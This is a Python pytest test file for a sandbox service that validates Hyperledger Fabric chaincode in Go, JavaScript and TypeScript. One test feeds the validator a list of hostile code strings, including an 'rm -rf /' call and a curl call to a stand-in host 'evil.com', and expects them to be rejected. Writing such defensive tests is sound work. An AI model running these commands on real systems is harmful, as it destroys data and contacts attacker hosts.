"""
Test suite for Sandbox Service
Tests chaincode validation in isolated environment
"""
import pytest
import tempfile
import os
from app.services.sandbox_service import SandboxService


class TestSandboxService:
    """Test cases for SandboxService"""
    
    @pytest.fixture
    def sandbox_service(self):
        """Create sandbox service instance"""
        service = SandboxService()
        yield service
        # Cleanup will be handled by __del__
    
    def test_security_pattern_detection(self, sandbox_service):
        """Test detection of malicious code patterns"""
        # Test dangerous patterns
        malicious_codes = [
            "import os\nos.system('rm -rf /')",
            "import subprocess\nsubprocess.call(['curl', 'evil.com'])",
            "eval('malicious_code')",
            "exec('dangerous_code')",
            "__import__('os').system('hack')",
        ]
        
        for code in malicious_codes:
            result = sandbox_service.validate_chaincode_in_sandbox(
                chaincode_name="malicious-test",
                chaincode_source=code,
                language="golang"
            )
            assert result["success"] is False
            assert len(result["errors"]) > 0
            assert "dangerous pattern" in result["errors"][0].lower()
    
    def test_golang_validation_missing_imports(self, sandbox_service):
        """Test Go chaincode validation with missing imports"""
        go_code = """
package main

func main() {
    // No fabric imports
}
"""
        result = sandbox_service.validate_chaincode_in_sandbox(
            chaincode_name="test-go",
            chaincode_source=go_code,
            language="golang"
        )
        
        # Should pass basic checks but have warnings
        assert "warnings" in result
    
    def test_golang_validation_missing_struct(self, sandbox_service):
        """Test Go chaincode without SmartContract struct"""
        go_code = """
package main

import "fmt"

func main() {
    fmt.Println("Hello")
}
"""
        result = sandbox_service.validate_chaincode_in_sandbox(
            chaincode_name="test-go-nostruct",
            chaincode_source=go_code,
            language="golang"
        )
        
        assert result["success"] is False
        assert any("SmartContract struct" in err for err in result.get("errors", []))
    
    def test_golang_valid_chaincode(self, sandbox_service):
        """Test valid Go chaincode structure"""
        go_code = """
package main

import (
    "github.com/hyperledger/fabric-contract-api-go/contractapi"
)

type SmartContract struct {
    contractapi.Contract
}

func (s *SmartContract) InitLedger(ctx contractapi.TransactionContextInterface) error {
    return nil
}

func main() {}
"""
        result = sandbox_service.validate_chaincode_in_sandbox(
            chaincode_name="test-go-valid",
            chaincode_source=go_code,
            language="golang"
        )
        
        # Should have minimal or no errors
        assert "errors" in result or "warnings" in result
    
    def test_javascript_validation_missing_contract(self, sandbox_service):
        """Test JavaScript chaincode without Contract class"""
        js_code = """
const someFunction = () => {
    console.log('Hello');
};
"""
        result = sandbox_service.validate_chaincode_in_sandbox(
            chaincode_name="test-js",
            chaincode_source=js_code,
            language="javascript"
        )
        
        assert result["success"] is False
        assert any("Contract class" in err for err in result.get("errors", []))
    
    def test_javascript_valid_chaincode(self, sandbox_service):
        """Test valid JavaScript chaincode"""
        js_code = """
const { Contract } = require('fabric-contract-api');

class MyContract extends Contract {
    async initLedger(ctx) {
        console.log('Ledger initialized');
    }
    
    async createAsset(ctx, id, value) {
        await ctx.stub.putState(id, Buffer.from(value));
    }
}

module.exports = MyContract;
"""
        result = sandbox_service.validate_chaincode_in_sandbox(
            chaincode_name="test-js-valid",
            chaincode_source=js_code,
            language="javascript"
        )
        
        assert result["success"] is True or len(result.get("warnings", [])) > 0
    
    def test_typescript_validation(self, sandbox_service):
        """Test TypeScript chaincode validation"""
        ts_code = """
import { Context, Contract } from 'fabric-contract-api';

export class MyContract extends Contract {
    public async initLedger(ctx: Context): Promise<void> {
        console.log('Ledger initialized');
    }
}
"""
        result = sandbox_service.validate_chaincode_in_sandbox(
            chaincode_name="test-ts",
            chaincode_source=ts_code,
            language="typescript"
        )
        
        # Should validate structure even without compilation
        assert "errors" in result or "warnings" in result
        assert result["language"] == "typescript"
    
    def test_unsupported_language(self, sandbox_service):
        """Test validation with unsupported language"""
        result = sandbox_service.validate_chaincode_in_sandbox(
            chaincode_name="test-unsupported",
            chaincode_source="some code",
            language="python"  # Not supported
        )
        
        assert result["success"] is False
        assert "Unsupported language" in result.get("error", "")
    
    def test_sandbox_cleanup(self):
        """Test sandbox directory cleanup"""
        service = SandboxService()
        temp_dir = service.temp_dir
        
        # Verify temp directory exists
        assert os.path.exists(temp_dir)
        
        # Delete service (trigger __del__)
        del service
        
        # Directory should be cleaned up (may not be immediate due to Python GC)
        # This is more of a smoke test
    
    def test_validation_exception_handling(self, sandbox_service):
        """Test error handling in validation"""
        # Pass invalid/malformed data
        result = sandbox_service.validate_chaincode_in_sandbox(
            chaincode_name="",  # Empty name
            chaincode_source="",  # Empty source
            language="golang"
        )
        
        # Should handle gracefully
        assert "success" in result or "error" in result


if __name__ == "__main__":
    pytest.main([__file__, "-v"])

